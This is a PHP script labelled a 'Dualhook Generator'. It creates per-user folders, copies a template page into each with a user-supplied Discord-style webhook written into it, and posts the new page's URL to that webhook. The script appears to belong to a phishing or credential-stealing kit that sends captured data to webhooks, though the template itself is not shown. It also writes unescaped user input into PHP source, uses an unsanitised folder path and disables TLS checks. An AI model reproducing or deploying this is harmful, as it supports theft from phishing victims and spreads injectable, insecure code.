<?php
# ItsYaboyNathan
$folder = $_POST['folder'];
include("../settings.php");
if(!is_dir($folder)){
mkdir("../$folder");
} else {
die('Directory Taken By Another User!');
}
$Dualwebhook = $_POST['webhook'];
$code = file_get_contents("file.php");
$myfile = fopen("../$folder/index.php", "w");
$txt = $code;
fwrite($myfile, '<?php $dualhook = "'.$Dualwebhook.'"; ?>'.$txt);
$headers = ["Content-Type: application/json; charset=utf-8"];
$POST = [
    "username" => "$name - Notifier",
    "avatar_url" => "",
    "content" => "Hello!",
    "embeds" => [
        [
            "title" => "Dualhook Generator",
            "type" => "rich",
            "color" => hexdec("$color"),
            "url" => "http://www." . $_SERVER["SERVER_NAME"] . "/$folder",
            "fields" => [
                [
                    "name" => "**Your Url:**",
                    "value" => "```http://www." . $_SERVER["SERVER_NAME"] . "/$folder```",
                    "inline" => false
                ],
            ],
        ],
    ],
];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $Dualwebhook);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response = curl_exec($ch);
header("location: ../$folder/");
?>